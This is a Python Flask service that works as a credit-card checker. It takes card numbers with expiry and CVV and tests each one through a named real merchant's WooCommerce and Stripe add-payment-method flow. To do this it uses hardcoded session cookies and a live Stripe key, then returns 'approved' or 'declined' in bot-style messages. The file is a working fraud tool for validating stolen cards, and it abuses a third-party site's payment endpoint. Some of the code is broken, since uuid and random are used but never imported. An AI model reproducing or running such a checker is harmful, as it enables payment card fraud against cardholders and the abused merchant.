from flask import Flask, request, jsonify
import requests
import json
import time
import re
import urllib.parse

app = Flask(__name__)

# ==========================================
# 🎯 CONFIGURATION
# ==========================================
DOMAIN = "https://infiniteautowerks.com"
STRIPE_PK = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"

# 🍪 UPDATE COOKIES HERE MANUALLY
COOKIES = {
    'wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb': 'u1p52ztc6vohh%7C1771562394%7CJIZ5Q3h6XMLC5Y4FvSlmgddkar7hLwYYMbEGUoFiVBM%7C5fb6d183c2ade1d6c34d3c2ed82769944a5ae532282659117fc65f4d2d777264',
    'checkout_continuity_service': '0a3d1867-f110-49bd-bfcd-ef8badf28651',
    'tk_or': '%22%22',
    'tk_lr': '%22%22',
    'tk_ai': 'rXt88lA3Me0RTe0YT26us8eo',
    '__stripe_mid': 'c51016f9-4a64-4d61-b8de-658a307e938c8046a4',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2026-02-06%2004%3A00%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2026-02-06%2004%3A00%3A29%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'tk_r3d': '%22%22',
    '__stripe_sid': '50e9b92c-199b-4451-b6fb-4c754c6631cc699bbd',
    'PHPSESSID': 'bsl8mi8ks7445fod4ba9kev7bf',
    'wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb': 'u1p52ztc6vohh%7C1771562394%7CJIZ5Q3h6XMLC5Y4FvSlmgddkar7hLwYYMbEGUoFiVBM%7C795a3d5953cf413cb90393e30a10384d06ad128d5ce01a647d38bd64a2fc9e70',
    '__cf_bm': 'jDjpPsrTRB.Li8jxePJK__Eivk2qsER63HguZV9AIto-1770352833-1.0.1.1-uK3EVC3uzsIY0pJA2fZJE0UvLDBS8RiIpoHCEYik5aqRAqgKNgkUg8g5SwynjPvqGh2I_99q2tSgdtFhHNXZJ2D0SoxgEOnEq0lGG2GSsuM',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F',
    'tk_qs': '',
}

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    # Debug information
    print("🔔 Headers:", dict(request.headers))
    print("🔔 Args:", dict(request.args))
    print("🔔 Values:", dict(request.values))
    try:
        print("🔔 JSON:", request.get_json(silent=True))
    except: pass
    
    # URL Format: /check?cc=4532...|05|26|020
    folder_cc = request.args.get('cc')
    
    if not folder_cc:
        if request.is_json:
            json_data = request.json
            folder_cc = json_data.get('cc') or json_data.get('card') or json_data.get('lista')
            if not folder_cc and all(k in json_data for k in ['card_number', 'exp_month', 'exp_year', 'cvv']):
                 folder_cc = f"{json_data['card_number']}|{json_data['exp_month']}|{json_data['exp_year']}|{json_data['cvv']}"
        else:
            values = request.values
            folder_cc = values.get('cc') or values.get('card') or values.get('lista')
            if not folder_cc and all(k in values for k in ['card_number', 'exp_month', 'exp_year', 'cvv']):
                 folder_cc = f"{values['card_number']}|{values['exp_month']}|{values['exp_year']}|{values['cvv']}"
    
    if not folder_cc:
        try:
            # Try to populate folder_cc from raw data if it looks like a CC line
            data_str = request.get_data(as_text=True)
            print("🔔 Raw Data:", data_str)
            match = re.search(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', data_str)
            if match:
                folder_cc = match.group(0)
        except: pass

    if not folder_cc:
        return jsonify({
            "status": "error",
            "message": f"❌ Give me CC! keys received: {list(request.values.keys()) + list(request.json.keys() if request.is_json and request.json else [])}"
        })

    try:
        cc, mon, year, cvv = folder_cc.strip().split('|')
        year = year[-2:]
    except:
        return jsonify({
            "status": "error",
            "message": "❌ Invalid format! Use: cc|mm|yy|cvv"
        })

    session = requests.Session()
    session.cookies.update(COOKIES)

    # ==========================================
    # STEP 1: Get Nonce from Page
    # ==========================================
    headers_step1 = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
        'priority': 'u=0, i',
        'referer': 'https://infiniteautowerks.com/my-account/payment-methods/',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        req1 = session.get(f"{DOMAIN}/my-account/add-payment-method/", headers=headers_step1, timeout=10)
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"❌ CONNECTION ERROR"
        })

    # Error Detection
    if req1.status_code == 403:
        return jsonify({
            "status": "declined",
            "message": "🚫 COOKIES EXPIRED - Access Denied (403)",
            "bot_message": f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: Cookies Expired (403)"
        })
    
    if "wp-login.php" in req1.text or "login" in req1.text.lower()[:500]:
        return jsonify({
            "status": "declined",
            "message": "🔐 COOKIES EXPIRED - Redirected to login",
            "bot_message": f"❌ ᴅᴇᴄʟɪ𝗻𝗲𝗱 ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: Cookies Expired (Login Redirect)"
        })

    setup_intent_nonce = parseX(req1.text, '"createAndConfirmSetupIntentNonce":"', '"')
    
    if setup_intent_nonce == "None":
        return jsonify({
            "status": "declined",
            "message": "⚠️ NO NONCE - Update Cookies",
            "bot_message": f"❌ ᴅᴇᴄʟɪ𝗻𝗲𝗱 ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: No Nonce Found - Update Cookies"
        })

    # ==========================================
    # STEP 2: Create Stripe PM
    # ==========================================
    headers2 = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    guid = str(uuid.uuid4())
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())
    client_session_id = str(uuid.uuid4()) # Assuming this is also a UUID

    # Constructing data based on user payload
    data_step2 = (
        f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={year}&card[exp_month]={mon}'
        f'&allow_redisplay=unspecified&billing_details[address][country]=IN&pasted_fields=number'
        f'&payment_user_agent=stripe.js%2F3233cbd46e%3B+stripe-js-v3%2F3233cbd46e%3B+payment-element%3B+deferred-intent%3B+autopm'
        f'&referrer=https%3A%2F%2Finfiniteautowerks.com&time_on_page={random.randint(40000, 60000)}'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=payment-element'
        f'&client_attribution_metadata[merchant_integration_version]=2021'
        f'&client_attribution_metadata[payment_intent_creation_flow]=deferred'
        f'&client_attribution_metadata[payment_method_selection_flow]=automatic'
        f'&client_attribution_metadata[elements_session_config_id]=7d706f32-bb02-4407-9b93-b78102c55b25'
        f'&client_attribution_metadata[merchant_integration_additional_elements][0]=payment'
        f'&guid={guid}&muid={muid}&sid={sid}&key={STRIPE_PK}&_stripe_version=2024-06-20'
        f'&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcwMzQ5ODU1LC... (Trimming long token)' 
    )

    req2 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data_step2, timeout=10)
    
    if req2.status_code != 200:
        try:
            err = req2.json()['error']['message']
        except:
            err = "Stripe Error"
        
        return jsonify({
            "status": "declined",
            "message": f"Stripe Declined: {err}",
            "bot_message": f"❌ ᴅᴇᴄ𝗹𝗶𝗻𝗲𝗱 ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: {err}"
        })

    pm_id = req2.json().get('id')
    if not pm_id:
         return jsonify({
            "status": "error",
            "message": "No PM ID",
            "bot_message": f"❌ ᴅᴇᴄ𝗹𝗶𝗻𝗲𝗱 ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: Failed to create PM"
        })

    # ==========================================
    # STEP 3: Charging
    # ==========================================
    headers_step3 = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://infiniteautowerks.com',
        'priority': 'u=1, i',
        'referer': 'https://infiniteautowerks.com/my-account/add-payment-method/',
        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data3 = {
        "action": "wc_stripe_create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": setup_intent_nonce,
    }

    req3 = session.post(f"{DOMAIN}/wp-admin/admin-ajax.php", headers=headers_step3, data=data3, timeout=30)
    
    # ==========================================
    # RESPONSE HANDLING
    # ==========================================
    result_text = req3.text.strip()
    print(f"✅ RAW GATEWAY RESPONSE: {result_text}")
    
    # Check for empty/invalid response (cookies expired)
    if result_text == "0" or result_text == "" or len(result_text) < 5:
        return jsonify({
            "status": "declined",
            "message": "🔐 COOKIES EXPIRED - Invalid Session",
            "bot_message": f"❌ ᴅᴇᴄʟɪ𝗻𝗲𝗱 ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: Cookies Expired (Response: {result_text})"
        })
    
    if '"success":true' in result_text:
        msg = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥\n𝗖𝗖: {folder_cc}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Infinite Auto Werks\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Authorized"
        status = "approved"
    elif "insufficient" in result_text.lower():
        msg = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 (CVV)\n𝗖𝗖: {folder_cc}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Infinite Auto Werks\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Insufficient Funds"
        status = "approved"
    else:
        # Extract Error
        try:
            js = req3.json()
            if 'data' in js and 'error' in js['data']:
                error_msg = js['data']['error']['message']
            elif 'message' in js:
                error_msg = js['message']
            else:
                error_msg = "Declined"
        except:
            if "declined" in result_text.lower():
                error_msg = "Your card was declined."
            else:
                 error_msg = f"Unknown Error (Response: {result_text[:50]})"

        msg = f"❌ ᴅᴇᴄʟɪ𝗻𝗲𝗱 ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: {error_msg}"
        status = "declined"

    return jsonify({
        "status": status,
        "response": error_msg if status == "declined" else "Authorized",
        "message": error_msg if status == "declined" else "Authorized",
        "data": error_msg if status == "declined" else "Authorized",
        "bot_message": msg
    })

if __name__ == '__main__':
    print("🚀 API Running on port 5000...")
    app.run(host='0.0.0.0', port=5000)
